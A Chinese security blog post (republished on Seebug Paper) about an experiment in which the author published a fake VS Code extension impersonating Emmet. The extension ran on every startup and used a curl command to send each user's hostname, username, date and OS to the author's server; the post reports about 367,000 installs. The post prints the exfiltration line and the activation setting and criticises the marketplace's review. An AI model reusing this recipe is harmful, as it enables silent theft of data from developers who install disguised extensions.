作者：栋栋的栋  
作者博客：[https://d0n9.github.io/](https://d0n9.github.io/2018/01/17/vscode%20extension%20%E9%92%93%E9%B1%BC/
"https://d0n9.github.io/")

灵感来源于fate0这篇 [Package 钓鱼](https://paper.seebug.org/311/ "Package 钓鱼")
（编者注：Seebug Paper收录该文后，知道创宇404实验室在作者分析基础上发现了新的钓鱼行为，详见[《被忽视的攻击面：Python package
钓鱼》](https://paper.seebug.org/326/ "被忽视的攻击面：Python package 钓鱼"))

随想做一次针对开发者的“钓鱼”实验，编程语言模块库的钓鱼实验fate0和ztz已经做过了，所以这次把实验对象选择编辑器(IDE)

5$买了一台廉价vps用作收集用户数据，收集以下信息。

  * hostname
  * whoami
  * date
  * uname
  * ip

    
    
    mysql> desc db;
    +----------+-----------------+------+-----+---------+----------------+
    | Field    | Type            | Null | Key | Default | Extra          |
    +----------+-----------------+------+-----+---------+----------------+
    | id       | int(4) unsigned | NO   | PRI | NULL    | auto_increment |
    | hostname | varchar(32)     | NO   |     | NULL    |                |
    | whoami   | varchar(32)     | NO   |     | NULL    |                |
    | date     | varchar(32)     | NO   |     | NULL    |                |
    | uname    | varchar(32)     | NO   |     | NULL    |                |
    | ide      | varchar(32)     | NO   |     | NULL    |                |
    | ip       | varchar(32)     | NO   |     | NULL    |                |
    +----------+-----------------+------+-----+---------+----------------+

获取ip方式使用`$_SERVER[“REMOTE_ADDR”];` 所以可能会不准确。

好了，回到主题

选择制作Visual Stuio Code的“恶意”插件，需要用到的工具是 Yeoman 和 vsce

> npm install -g yo generator-code npm install -g vsce

![](https://images.seebug.org/content/images/2018/03/aa6d6cb8-1522-4dc7-9c44-6d29a2b9e392.jpg-w331s)

选择TypeScript语言作为插件的代码语言，可以导入Node.js进程通信模块 **import { execSync } from
‘child_process’;** ，就可以使用exec() execSync() 执行命令

./test/src/extension.ts

    
    
    execSync('curl "http://45.32.40.141/" --user-agent "$(echo `hostname`, `whoami`, `date "+%Y-%m-%d %H:%M:%S"`, `uname`, vscode | base64)"')

执行curl命令外带出数据，有个不足没有考虑Windows系统，这也是导致了最后插件安装量很大但是实际有效数据不多的原因。

考虑再三还是把命令硬编码在代码里，因为只是一次实验，如果下发脚本的方式就会被当作真的是恶意程序

还有一个知识点，vscode启动默认是不加载插件的，这是因为官方考虑到加载插件会拖慢启动速度，只有设置触发条件才会启动

./test/src/package.json

    
    
    "activationEvents": [
        "onCommand:extension.sayHello"
    ],

改为

    
    
    "activationEvents": [
        "*",
        "onCommand:extension.sayHello"
    ],

星号表示任何情况下都会触发，就这么简单，一个恶意的插件就做好了，当然为了使之更加逼真还要增加一些迷惑性的内容，比如README.md最好图文并茂，再给插件设置一张icon，就可以上传到
<https://marketplace.visualstudio.com> 了，几分钟就审核通过，那肯定是自动审核了

![](https://images.seebug.org/content/images/2018/03/f9a056e3-077d-4a8c-b2eb-50b9ac6ce6c5.jpg-w331s)

可能是因为Emmet知名度太高（用过sublime的小伙伴肯定知道这个插件）”恶意“插件上架仅两天就有了二十九万的安装量，后来发现竟然还上了首页热门推荐，这是意想不到的，起初还在担心如果不可控了咋办，最后证明这个担心是多余的，XDD

![](https://images.seebug.org/content/images/2018/03/6e572ca2-0dea-4ffe-99de-d1317b7abba0.jpg-w331s)

当然也不是那么顺利，因为插件并没有实际功能，还是被几位外国人识破举报了，周二一早就被官方下架了，从周六到周二仅持续了三天时间，相信如果是在正常插件中加入恶意代码肯定会潜伏更长更不易被发现。

![](https://images.seebug.org/content/images/2018/03/73799a13-10d6-4613-9b56-e9ebe912dc93.jpg-w331s)

但是在下架的时候已经有了367004次的安装量
<https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview>

![](https://images.seebug.org/content/images/2018/03/d9f30993-e0f5-487d-8dbc-cf3f939f7437.jpg-w331s)

因为每次启动都会加载插件执行命令，所以上报的数据需要去重，hostname 加 whoami hash 后当作 uid
去重统计操作系统占比，可以看出other数量最多，这部分可能是Windows或是其他原因没有上报数据

![](https://images.seebug.org/content/images/2018/03/f92fa18a-e593-4894-bd7d-b41efb0cf575.jpg-w331s)

中招最多的国家top10，数据验证使用 <http://ip.taobao.com/service/getIpInfo.php>

![](https://images.seebug.org/content/images/2018/03/d65c70fc-278a-44e8-a66f-c26984672c2d.jpg-w331s)

思考，是什么原因导致三天达到三十几万的安装量呢？

这个锅官方是背定了，因为官方审核机制不严格，spam
不及时，甚至还登上了首页热门推荐两天才导致大量安装，后续没有补救措施，对于已经安装了恶意插件的用户没有提示告知，只对插件做了下架处理，原本已经安装的用户还是会受影响。

ide有那么多，sublime
是使用Python写插件，JetBrains家和Eclipse用Java，Notepad用c，都可以按照类似思路构造出恶意插件。

未来会不会再出现xcodeghost事件呢？拭目以待。

ref：

  * <https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2>
  * <http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/>
  * <https://code.visualstudio.com/docs/extensions/overview>
  * <http://nodejs.cn/api/child_process.html>
  * [http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&isappinstalled=0](http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&isappinstalled=0)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/539/>

